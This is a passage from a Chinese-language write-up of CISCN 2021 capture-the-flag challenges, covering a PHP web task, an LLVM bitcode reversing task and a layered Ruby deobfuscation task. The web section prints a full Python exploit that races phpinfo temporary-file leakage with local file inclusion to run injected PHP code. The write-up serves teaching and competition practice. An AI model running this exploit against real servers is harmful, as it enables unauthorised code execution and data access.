</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><p>在.listing文件列出了当前目录的文件，存在一个<code>/you_can_seeeeeeee_me.php</code>文件，访问之后发现是phpinfo文件，与文件包含组合利用，包含上传的临时文件，可造成代码执行，枚举/etc目录中的文件</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#!/usr/bin/python </span>
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> threading
<span class="token keyword">import</span> socket

<span class="token keyword">def</span> <span class="token function">setup</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>
    TAG<span class="token operator">=</span><span class="token string">&quot;Security Test&quot;</span>
    PAYLOAD<span class="token operator">=</span><span class="token triple-quoted-string string">&quot;&quot;&quot;%s\r
&lt;?php var_dump(scandir('/etc'));?&gt;\r&quot;&quot;&quot;</span> <span class="token operator">%</span> TAG
    REQ1_DATA<span class="token operator">=</span><span class="token triple-quoted-string string">&quot;&quot;&quot;-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\r
Content-Type: text/plain\r
\r
%s
-----------------------------7dbff1ded0714--\r&quot;&quot;&quot;</span> <span class="token operator">%</span> PAYLOAD
    padding<span class="token operator">=</span><span class="token string">&quot;A&quot;</span> <span class="token operator">*</span> <span class="token number">5000</span>
    REQ1<span class="token operator">=</span><span class="token triple-quoted-string string">&quot;&quot;&quot;POST /you_can_seeeeeeee_me.php?a=&quot;&quot;&quot;</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">&quot;&quot;&quot; HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">&quot;&quot;&quot;\r
HTTP_ACCEPT: &quot;&quot;&quot;</span> <span class="token operator">+</span> padding <span class="token operator">+</span> <span class="token triple-quoted-string string">&quot;&quot;&quot;\r
HTTP_USER_AGENT: &quot;&quot;&quot;</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">&quot;&quot;&quot;\r
HTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">&quot;&quot;&quot;\r
HTTP_PRAGMA: &quot;&quot;&quot;</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">&quot;&quot;&quot;\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r
\r
%s&quot;&quot;&quot;</span> <span class="token operator">%</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>REQ1_DATA<span class="token punctuation">)</span><span class="token punctuation">,</span>host<span class="token punctuation">,</span>REQ1_DATA<span class="token punctuation">)</span>
    <span class="token comment">#modify this to suit the LFI script   </span>
    LFIREQ<span class="token operator">=</span><span class="token triple-quoted-string string">&quot;&quot;&quot;POST /index.php HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Content-Type: application/x-www-form-urlencoded
Host: %s\r
Content-Length: %s\r
\r
%s
&quot;&quot;&quot;</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>REQ1<span class="token punctuation">,</span> TAG<span class="token punctuation">,</span> LFIREQ<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">phpInfoLFI</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> phpinforeq<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> lfireq<span class="token punctuation">,</span> tag<span class="token punctuation">)</span><span class="token punctuation">:</span>
    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
    s2 <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    

    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
    s2<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>

    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>phpinforeq<span class="token punctuation">)</span>
    d <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>
    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span> <span class="token operator">&lt;</span> offset<span class="token punctuation">:</span>
        d <span class="token operator">+=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        i <span class="token operator">=</span> d<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">&quot;[tmp_name] =&amp;gt; &quot;</span><span class="token punctuation">)</span>
        fn <span class="token operator">=</span> d<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">17</span><span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">31</span><span class="token punctuation">]</span>
    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">None</span>

    fn <span class="token operator">=</span> <span class="token string">'cf=/../../../../../../../'</span> <span class="token operator">+</span> fn
    s2<span class="token punctuation">.</span>send<span class="token punctuation">(</span>lfireq <span class="token operator">%</span> <span class="token punctuation">(</span>host<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span><span class="token punctuation">,</span>fn<span class="token punctuation">)</span><span class="token punctuation">)</span>
    d <span class="token operator">=</span> s2<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    s2<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment">#print(d)</span>

    <span class="token keyword">if</span> d<span class="token punctuation">.</span>find<span class="token punctuation">(</span>tag<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>
        <span class="token keyword">return</span> fn

counter<span class="token operator">=</span><span class="token number">0</span>
<span class="token keyword">class</span> <span class="token class-name">ThreadWorker</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> e<span class="token punctuation">,</span> l<span class="token punctuation">,</span> m<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>
        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>event <span class="token operator">=</span> e
        self<span class="token punctuation">.</span>lock <span class="token operator">=</span>  l
        self<span class="token punctuation">.</span>maxattempts <span class="token operator">=</span> m
        self<span class="token punctuation">.</span>args <span class="token operator">=</span> args

    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">global</span> counter
        <span class="token keyword">while</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">with</span> self<span class="token punctuation">.</span>lock<span class="token punctuation">:</span>
                <span class="token keyword">if</span> counter <span class="token operator">&gt;=</span> self<span class="token punctuation">.</span>maxattempts<span class="token punctuation">:</span>
                    <span class="token keyword">return</span>
                counter<span class="token operator">+=</span><span class="token number">1</span>

            <span class="token keyword">try</span><span class="token punctuation">:</span>
                x <span class="token operator">=</span> phpInfoLFI<span class="token punctuation">(</span><span class="token operator">*</span>self<span class="token punctuation">.</span>args<span class="token punctuation">)</span>
                <span class="token keyword">if</span> self<span class="token punctuation">.</span>event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    <span class="token keyword">break</span>                
                <span class="token keyword">if</span> x<span class="token punctuation">:</span>
                    <span class="token keyword">print</span> <span class="token string">&quot;\nGot it! Shell created in /tmp/g&quot;</span>
                    self<span class="token punctuation">.</span>event<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                    
            <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error<span class="token punctuation">:</span>
                <span class="token keyword">return</span>
    

<span class="token keyword">def</span> <span class="token function">getOffset</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> phpinforeq<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">&quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;</span>
    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>phpinforeq<span class="token punctuation">)</span>
    
    d <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        i <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>
        d<span class="token operator">+=</span>i        
        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">:</span>
            <span class="token keyword">break</span>
        <span class="token comment"># detect the final chunk</span>
        <span class="token keyword">if</span> i<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">&quot;0\r\n\r\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">break</span>
    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    i <span class="token operator">=</span> d<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;[tmp_name] =&amp;gt; &quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">&quot;No php tmp_name in phpinfo output&quot;</span><span class="token punctuation">)</span>
    
    <span class="token keyword">print</span> <span class="token string">&quot;found %s at %i&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>d<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span>
    <span class="token comment"># padded up a bit</span>
    <span class="token keyword">return</span> i<span class="token operator">+</span><span class="token number">256</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    
    <span class="token keyword">print</span> <span class="token string">&quot;LFI With PHPInfo()&quot;</span>
    <span class="token keyword">print</span> <span class="token string">&quot;-=&quot;</span> <span class="token operator">*</span> <span class="token number">30</span>

    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">&quot;Usage: %s host [port] [threads]&quot;</span> <span class="token operator">%</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        host <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostbyname<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error<span class="token punctuation">,</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">&quot;Error with hostname %s: %s&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

    port<span class="token operator">=</span><span class="token number">80</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        port <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
    <span class="token keyword">except</span> ValueError<span class="token punctuation">,</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">&quot;Error with port %d: %s&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    
    poolsz<span class="token operator">=</span><span class="token number">10</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        poolsz <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
    <span class="token keyword">except</span> ValueError<span class="token punctuation">,</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">&quot;Error with poolsz %d: %s&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span> <span class="token string">&quot;Getting initial offset...&quot;</span><span class="token punctuation">,</span>  
    reqphp<span class="token punctuation">,</span> tag<span class="token punctuation">,</span> reqlfi <span class="token operator">=</span> setup<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span>
    offset <span class="token operator">=</span> getOffset<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> reqphp<span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>

    maxattempts <span class="token operator">=</span> <span class="token number">1000</span>
    e <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>
    l <span class="token operator">=</span> threading<span class="token punctuation">.</span>Lock<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span> <span class="token string">&quot;Spawning worker pool (%d)...&quot;</span> <span class="token operator">%</span> poolsz
    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>

    tp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>poolsz<span class="token punctuation">)</span><span class="token punctuation">:</span>
        tp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ThreadWorker<span class="token punctuation">(</span>e<span class="token punctuation">,</span>l<span class="token punctuation">,</span>maxattempts<span class="token punctuation">,</span> host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> reqphp<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> reqlfi<span class="token punctuation">,</span> tag<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> t <span class="token keyword">in</span> tp<span class="token punctuation">:</span>
        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">while</span> <span class="token keyword">not</span> e<span class="token punctuation">.</span>wait<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> e<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">break</span>
            <span class="token keyword">with</span> l<span class="token punctuation">:</span>
                sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span> <span class="token string">&quot;\r% 4d / % 4d&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>counter<span class="token punctuation">,</span> maxattempts<span class="token punctuation">)</span><span class="token punctuation">)</span>
                sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> counter <span class="token operator">&gt;=</span> maxattempts<span class="token punctuation">:</span>
                    <span class="token keyword">break</span>
        <span class="token keyword">print</span>
        <span class="token keyword">if</span> e<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span> <span class="token string">&quot;Woot!  \m/&quot;</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span> <span class="token string">&quot;:(&quot;</span>
    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">&quot;\nTelling threads to shutdown...&quot;</span>
        e<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    
    <span class="token keyword">print</span> <span class="token string">&quot;Shuttin' down...&quot;</span>
    <span class="token keyword">for</span> t <span class="token keyword">in</span> tp<span class="token punctuation">:</span>
        t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">&quot;__main__&quot;</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br><span class="line-number">100</span><br><span class="line-number">101</span><br><span class="line-number">102</span><br><span class="line-number">103</span><br><span class="line-number">104</span><br><span class="line-number">105</span><br><span class="line-number">106</span><br><span class="line-number">107</span><br><span class="line-number">108</span><br><span class="line-number">109</span><br><span class="line-number">110</span><br><span class="line-number">111</span><br><span class="line-number">112</span><br><span class="line-number">113</span><br><span class="line-number">114</span><br><span class="line-number">115</span><br><span class="line-number">116</span><br><span class="line-number">117</span><br><span class="line-number">118</span><br><span class="line-number">119</span><br><span class="line-number">120</span><br><span class="line-number">121</span><br><span class="line-number">122</span><br><span class="line-number">123</span><br><span class="line-number">124</span><br><span class="line-number">125</span><br><span class="line-number">126</span><br><span class="line-number">127</span><br><span class="line-number">128</span><br><span class="line-number">129</span><br><span class="line-number">130</span><br><span class="line-number">131</span><br><span class="line-number">132</span><br><span class="line-number">133</span><br><span class="line-number">134</span><br><span class="line-number">135</span><br><span class="line-number">136</span><br><span class="line-number">137</span><br><span class="line-number">138</span><br><span class="line-number">139</span><br><span class="line-number">140</span><br><span class="line-number">141</span><br><span class="line-number">142</span><br><span class="line-number">143</span><br><span class="line-number">144</span><br><span class="line-number">145</span><br><span class="line-number">146</span><br><span class="line-number">147</span><br><span class="line-number">148</span><br><span class="line-number">149</span><br><span class="line-number">150</span><br><span class="line-number">151</span><br><span class="line-number">152</span><br><span class="line-number">153</span><br><span class="line-number">154</span><br><span class="line-number">155</span><br><span class="line-number">156</span><br><span class="line-number">157</span><br><span class="line-number">158</span><br><span class="line-number">159</span><br><span class="line-number">160</span><br><span class="line-number">161</span><br><span class="line-number">162</span><br><span class="line-number">163</span><br><span class="line-number">164</span><br><span class="line-number">165</span><br><span class="line-number">166</span><br><span class="line-number">167</span><br><span class="line-number">168</span><br><span class="line-number">169</span><br><span class="line-number">170</span><br><span class="line-number">171</span><br><span class="line-number">172</span><br><span class="line-number">173</span><br><span class="line-number">174</span><br><span class="line-number">175</span><br><span class="line-number">176</span><br><span class="line-number">177</span><br><span class="line-number">178</span><br><span class="line-number">179</span><br><span class="line-number">180</span><br><span class="line-number">181</span><br><span class="line-number">182</span><br><span class="line-number">183</span><br><span class="line-number">184</span><br><span class="line-number">185</span><br><span class="line-number">186</span><br><span class="line-number">187</span><br><span class="line-number">188</span><br><span class="line-number">189</span><br><span class="line-number">190</span><br><span class="line-number">191</span><br><span class="line-number">192</span><br><span class="line-number">193</span><br><span class="line-number">194</span><br><span class="line-number">195</span><br></div></div><p>在<code>/etc/fcbbfhbfbf/fhgedheeia/bdedgcecje/bhaabhejid/ecfajfcgba/fl444444g</code>，找到了flag：CISCN{GlWGe-8agDv-a6Gst-CShBt-32Vl0-}</p> <h2 id="baby-bc"><a href="#baby-bc" class="header-anchor">#</a> baby_bc</h2> <p>面对奇怪的<code>bc</code>文件一头雾水。一顿好找才发现这是LLVM生成的中间码文件，可以向下继续编译到机器码。<code>clang</code>编译之，拖进IDA。</p> <p>程序里满是二维数组（<code>map[5][5]</code>、<code>row[5][4]</code>、<code>col[4][5]</code>），输入被填入<code>map</code>，要求满足如下条件：</p> <ul><li>不得覆盖<code>map</code>中原有的数字（对应位置用<code>0</code>代替）</li> <li><code>map</code>每行、每列不得出现重复数字</li> <li>满足<code>row</code>中定义的水平相邻两数字的大小关系</li> <li>满足<code>col</code>中定义的竖直相邻两数字的大小关系</li> <li>数字范围限定为<code>[1, 5]</code>（原先为<code>[0, 5]</code>导致出现多解）</li></ul> <p>规则放到一起，变成了数学题。数学菜鸡运气还可以，试了半个小时试出来了。</p> <p><img src="2021-ciscn/2-1-1.png" alt=""></p> <p><code>CISCN{8a04b4597ad08b83211d3adfa1f61431}</code></p> <h2 id="little-evil"><a href="#little-evil" class="header-anchor">#</a> little_evil</h2> <p>……做到崩溃的五层壳子。</p> <p>拿到程序，14M的ELF，拖进IDA都卡的要死。突然顿悟，14M根本不是正常程序可能的大小，遂关掉IDA，7-zip文件分析，发现里面嵌着个squashfs打包的rootfs（这什么神奇技术）。</p> <p>翻一翻，发现里面除了一个ruby环境之外啥也没有。找到了主程序<code>__enclose_io_memfs__/local/out.rb</code>，拖出来打开一看，好的，有混淆那味了：</p> <div class="language-ruby line-numbers-mode"><pre class="language-ruby"><code>l1lll<span class="token punctuation">;</span>lIlI<span class="token punctuation">;</span>ll1l1<span class="token punctuation">;</span>l1lI<span class="token punctuation">;</span>l11I<span class="token punctuation">;</span>l1lll<span class="token punctuation">;</span>llI1l<span class="token punctuation">;</span>lIlll<span class="token punctuation">;</span>l11IlI<span class="token punctuation">;</span>l11I<span class="token punctuation">;</span>l1lll<span class="token punctuation">;</span>lIlll<span class="token punctuation">;</span>llI1l<span class="token punctuation">;</span>lIlI<span class="token punctuation">;</span>l11I<span class="token punctuation">;</span>l1lll<span class="token punctuation">;</span>llIl<span class="token punctuation">;</span>l1lI<span class="token punctuation">;</span>lIlll<span class="token punctuation">;</span>l11I<span class="token punctuation">;</span>l1lll<span class="token punctuation">;</span>llI1l<span class="token punctuation">;</span>l1IIII<span class="token punctuation">;</span>lIlll<span class="token punctuation">;</span>l11I<span class="token punctuation">;</span>l1lll<span class="token punctuation">;</span>llIl<span class="token punctuation">;</span>l1lI<span class="token punctuation">;</span>lIlll<span class="token punctuation">;</span>l11I<span class="token punctuation">;</span>l1lll<span class="token punctuation">;</span>llIl<span class="token punctuation">;</span>l1lI<span class="token punctuation">;</span>lIlll<span class="token punctuation">;</span>l11I<span class="token punctuation">;</span>l1lll<span class="token punctuation">;</span>llIl<span class="token punctuation">;</span>l1lI<span class="token punctuation">;</span>lIlll<span class="token punctuation">;</span>l11I<span class="token punctuation">;</span>l1lll<span class="token punctuation">;</span>llIl<span class="token punctuation">;</span>l1lI<span class="token punctuation">;</span>lIlll<span class="token punctuation">;</span>l11I<span class="token punctuation">;</span>l1lll<span class="token punctuation">;</span>l1lI<span class="token punctuation">;</span>ll1l1<span class="token punctuation">;</span>l1l111<span class="token punctuation">;</span>l11I<span class="token punctuation">;</span>l1lll<span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>捋一捋混淆代码，前面都是在构造字符串，最后一条指令用<code>send()</code>执行函数。修改代码加个<code>puts</code>，得到解混淆后的（下一层混淆的）代码。</p> <p>同样的混淆还有一层。解开后代码可读性“高了一点”：</p> <div class="language-ruby line-numbers-mode"><pre class="language-ruby"><code><span class="token keyword">begin</span> <span class="token variable">$_</span><span class="token operator">=</span>$$<span class="token operator">/</span>$$<span class="token punctuation">;</span><span class="token variable">@_</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token operator">+</span><span class="token variable">$_</span><span class="token punctuation">;</span>$<span class="token operator">-</span>_<span class="token operator">=</span><span class="token variable">$_</span><span class="token operator">-</span><span class="token variable">@_</span>
